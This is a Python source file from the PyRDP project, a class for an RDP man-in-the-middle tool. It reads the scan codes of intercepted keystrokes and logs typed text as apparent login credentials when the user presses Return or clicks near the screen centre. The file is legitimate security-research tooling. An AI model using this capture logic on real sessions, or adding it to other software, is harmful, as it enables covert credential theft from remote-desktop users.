#
# This file is part of the PyRDP project.
# Copyright (C) 2019-2020 GoSecure Inc.
# Licensed under the GPLv3 or later.
#
from logging import LoggerAdapter

from pyrdp.mitm.state import RDPMITMState
from pyrdp.enum import PointerFlag, ScanCode
from pyrdp.enum.scancode import getKeyName
from pyrdp.pdu.pdu import PDU
from pyrdp.layer.layer import Layer
from pyrdp.logging.StatCounter import StatCounter, STAT

class BasePathMITM:
    """
    Base MITM component for the fast-path and slow-path layers.
    """

    def __init__(self, state: RDPMITMState, client: Layer, server: Layer, statCounter: StatCounter, log: LoggerAdapter):
        self.state = state
        self.client = client
        self.server = server
        self.statCounter = statCounter
        self.log = log

    def onClientPDUReceived(self, pdu: PDU):
        raise NotImplementedError("onClientPDUReceived must be overridden")

    def onServerPDUReceived(self, pdu: PDU):
        raise NotImplementedError("onServerPDUReceived must be overridden")

    def loginAttempt(self):
        if self.state.loggedIn or self.state.inputBuffer == "":
            return

        self.state.credentialsCandidate = self.state.inputBuffer
        self.state.inputBuffer = ""

        self.log.info("Credentials attempt from heuristic: %(credentials_attempt)s", {
            "credentials_attempt": (self.state.credentialsCandidate)
        })

    def onMouse(self, mouseX: int, mouseY: int, pointerFlags: int):
        if pointerFlags & PointerFlag.PTRFLAGS_DOWN != 0:
            percentageX = mouseX / self.state.windowSize[0]
            percentageY = mouseY / self.state.windowSize[1]

            if 0.5 < percentageX < 0.65 and 0.5 < percentageY < 0.65:
                self.loginAttempt()

    def onScanCode(self, scanCode: int, isReleased: bool, isExtended: bool):
        """
        Handle scan code.
        """
        keyName = getKeyName(scanCode, isExtended, self.state.shiftPressed, self.state.capsLockOn)
        scanCodeTuple = (scanCode, isExtended)

        # Left or right shift
        if scanCodeTuple in [ScanCode.LSHIFT, ScanCode.RSHIFT]:
            self.state.shiftPressed = not isReleased
        # Caps lock
        elif scanCodeTuple == ScanCode.CAPSLOCK and not isReleased:
            self.state.capsLockOn = not self.state.capsLockOn
        # Control
        elif scanCodeTuple in [ScanCode.LCONTROL, ScanCode.RCONTROL]:
            self.state.ctrlPressed = not isReleased
        # Backspace
        elif scanCodeTuple == ScanCode.BACKSPACE and not isReleased:
            self.state.inputBuffer += "<\\b>"
        # Tab
        elif scanCodeTuple == ScanCode.TAB and not isReleased:
            self.state.inputBuffer += "<\\t>"
        # CTRL + A
        elif scanCodeTuple == ScanCode.KEY_A and self.state.ctrlPressed and not isReleased:
            self.state.inputBuffer += "<ctrl-a>"
        elif scanCodeTuple == ScanCode.SPACE and not isReleased:
            self.state.inputBuffer += " "
        # Return
        elif scanCodeTuple == ScanCode.RETURN and not isReleased:
            self.loginAttempt()
        # Normal input
        elif len(keyName) == 1:
            if not isReleased:
                self.state.inputBuffer += keyName
